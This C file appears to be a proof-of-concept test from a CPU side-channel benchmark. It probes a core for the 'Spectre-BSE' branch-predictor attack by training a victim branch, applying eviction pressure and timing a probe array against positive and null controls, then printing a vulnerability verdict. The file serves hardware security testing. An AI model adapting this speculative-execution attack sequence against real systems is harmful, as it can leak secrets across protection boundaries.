/**
 * spectre-bse: Branch Status Eviction (Spectre-BSE).
 *
 * BSE (Zhu & Biondi, 2025) abuses a bias-free branch predictor's Branch Status
 * Table (BST): a victim branch trained to a fixed outcome is marked "biased"
 * and its footprint is omitted from the branch history; an attacker evicts the
 * victim's BST entry via index aliasing so the victim is re-classified biased,
 * corrupting history and forcing a mis-speculation.  This requires a BST /
 * bias-free history filter.  The core uses a standard TAGE + GHR/PHR with no
 * documented BST, so the specific BSE primitive is expected to be absent.
 * This PoC probes for the bias-free filtering behavior and reports honestly:
 * it trains a victim conditional branch, attempts BST-style eviction with
 * congruent branches, and checks whether the victim's prediction flips.
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 80
#endif

static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));

/* Victim conditional branch: if (flag) leak probe[0x42].  Trained flag=1. */
static volatile int victim_flag;
__attribute__((noinline))
static void victim_branch(void) {
  if (victim_flag) {
    volatile uint8_t t = probe_array[(uintptr_t)0x42 * SC_PROBE_STRIDE];
    (void)t;
  }
}

int main(void) {
  if (sc_time_selfcheck("spectre-bse") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT spectre-bse ERROR reason=evict\n");
    return 1;
  }
  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();
  uint32_t R = SECURITY_ATTACK_ROUNDS;

  /* Positive control: architectural taken branch registers probe[0x42]. */
  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    victim_flag = 1;
    victim_branch();
    sc_fence();
    sc_probe_array(probe_array, &g, &pos, 0xb0b + r);
    pos.rounds++;
  }
  int pos_ok = pos.hits[0x42] >= R / 2;

  /* BSE attempt: train victim taken (biased), then execute congruent evictor
   * branches to alias/evict its predictor state, then run victim with flag=0
   * (architecturally not-taken).  A bias-free BST eviction would corrupt the
   * history and mis-speculate the leak even though flag=0. */
  sc_score_t atk;
  sc_score_reset(&atk);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    victim_flag = 1;
    for (int t = 0; t < 30; t++)
      victim_branch();          /* train biased taken */
    /* congruent eviction pressure (alias the predictor set) */
    sc_evict_capacity(&g);
    victim_flag = 0;            /* architecturally not-taken */
    victim_branch();            /* BSE would mis-speculate taken */
    sc_fence();
    sc_probe_array(probe_array, &g, &atk, 0x2222 + r);
    atk.rounds++;
  }
  sc_decision_t d = sc_decide(&atk, &pos, 0x42, pos_ok);
  /* Null reference is the positive-control taken rate; a BSE leak would show
   * probe[0x42] cached despite flag=0.  Compare against a true null (flag=0
   * without training) below. */
  sc_score_t nul;
  sc_score_reset(&nul);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    victim_flag = 0;
    victim_branch();
    sc_fence();
    sc_probe_array(probe_array, &g, &nul, 0x3333 + r);
    nul.rounds++;
  }
  d = sc_decide(&atk, &nul, 0x42, pos_ok);
  sc_result("spectre-bse", &d, pos_ok, 0x42, R, &g);
  printf("[spectre-bse] attack(flag=0)=%u/%u null=%u/%u pos=%d\n",
         (unsigned)atk.hits[0x42], (unsigned)R, (unsigned)nul.hits[0x42],
         (unsigned)R, pos_ok);
  if (d.verdict == SC_VULNERABLE)
    printf("[spectre-bse] VULNERABLE: bias-free BST eviction mis-speculation\n");
  else if (!pos_ok)
    printf("[spectre-bse] INCONCLUSIVE: positive control failed\n");
  else
    printf("[spectre-bse] NOT VULNERABLE: no bias-free BST filter detected "
           "(standard TAGE; BSE primitive absent)\n");
  return 0;
}